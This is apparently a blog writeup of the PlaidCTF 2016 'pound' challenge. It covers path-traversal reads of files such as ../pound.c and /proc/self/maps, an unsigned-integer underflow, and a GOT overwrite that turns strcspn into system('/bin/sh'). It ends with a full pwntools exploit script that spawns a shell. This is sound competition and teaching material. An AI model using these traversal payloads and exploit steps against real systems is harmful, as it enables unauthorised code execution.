---
layout: post
alias: "/blog/2016/04/18/plaidctf-2016-pound/"
date: 2016-04-18T06:00:03+09:00
tags: [ "ctf", "pwn", "writeup", "plaidctf" ]
---

# PlaidCTF 2016 pound

I like the gimmick to give the source code and compiled binaries.

## solution

### host.py

To get some required information, choose `1. Read Trump article` and send a relative path from `./tweets`.
You may want to read the paths:

-   `../pound.c`
-   `../../../../lib32/libc.so.6`
-   `../sims/sim-XXXX`
-   `../../../../proc/self/maps`

### pound.c

To make a vulnerability, you can use `0u`.
If `#define L1 0u`, `for (i=0; i < L1-1; i++)` becomes `for (i=0; i < 0xffffffff; i++)` by mixing signed and unsigned integers.

To be able to read/write somewhere, use the `char *announcement;`.
If you can modify this, read/write are done by `0. Print state`, `4. Create Announcement`.
Now, in `2. Simulate Propagate Forward` or `3. Simulate Propagate Backward`, the first loops don't terminate until it reaches a null dword.
So if you make `L1` and `L2` to `0u`, fill `char s1_name[STATE_SIZE_LEN];` and `char s2_name[STATE_SIZE_LEN];` with positives, it will reaches the `char *announcement;` and `int announcement_length;`.
When you use `2. Simulate Propagate Forward` with amount $k$, the null dword and the previous dword are increased by $k$.

To get shell, we need to know libc base address and let to call `system` with `/bin/sh`.
The both read/write can/should be done at once.
Make the `announcement` a pointer to the GOT, then read, and write the same address.
You should write `/bin/sh` and the address to `system` with `if (fgets (global.announcement, len, stdin) == NULL)` in `void create_announcement ()`, as the succeeding `strcspn(global.announcement, "\n")` acts as `system("/bin/sh", "\n")`.

### note

At this time, the GOT was like below.

``` sh
$ objdump -R sim

sim:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804affc R_386_GLOB_DAT    __gmon_start__
0804b040 R_386_COPY        stdin@@GLIBC_2.0
0804b060 R_386_COPY        stdout@@GLIBC_2.0
0804b00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804b010 R_386_JUMP_SLOT   strcspn@GLIBC_2.0
0804b014 R_386_JUMP_SLOT   free@GLIBC_2.0
0804b018 R_386_JUMP_SLOT   fgets@GLIBC_2.0
0804b01c R_386_JUMP_SLOT   malloc@GLIBC_2.0
0804b020 R_386_JUMP_SLOT   __gmon_start__
0804b024 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804b028 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804b02c R_386_JUMP_SLOT   __isoc99_sscanf@GLIBC_2.7
0804b030 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
0804b034 R_386_JUMP_SLOT   rand@GLIBC_2.0
```

By the way, what was `int secret;`?

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('sim')
libc = ELF('libc.so.6')

p = remote(args.host, args.port)

p.sendline('2')
p.recvuntil('[Smaller] State 1 Size:')
p.sendline('0u')
p.recvuntil('[Larger] State 2 Size:')
p.sendline('0u')

p.recvuntil('Enter the name of the first state:')
p.send('A' * 512)
p.recvuntil('Enter the name of the second state:')
p.send('A' * 512)
p.recvuntil('Enter Your Choice: ')
p.sendline('')

log.info('strcspn got: ' + hex(elf.got['strcspn']))
p.recvuntil('Enter Your Choice: ')
p.sendline('2')
p.sendline(str(elf.got['strcspn'] - 21))

p.recvuntil('Enter Your Choice: ')
p.sendline('2')
p.sendline(str(13))

p.recvuntil('Enter Your Choice: ')
p.sendline('0')
p.recvuntil('PSA: ')
p.recv(16)
libc_base = u32(p.recv(4)) - libc.symbols['fgets']
log.info('libc base: ' + hex(libc_base))

p.recvuntil('Enter Your Choice: ')
p.sendline('4')
p.recvuntil('Enter the length of your announcement: ')
p.sendline(str(13))
p.sendline('/bin/sh\0' + p32(libc_base + libc.symbols['system']))

time.sleep(1)
p.sendline('id')
p.interactive()
```
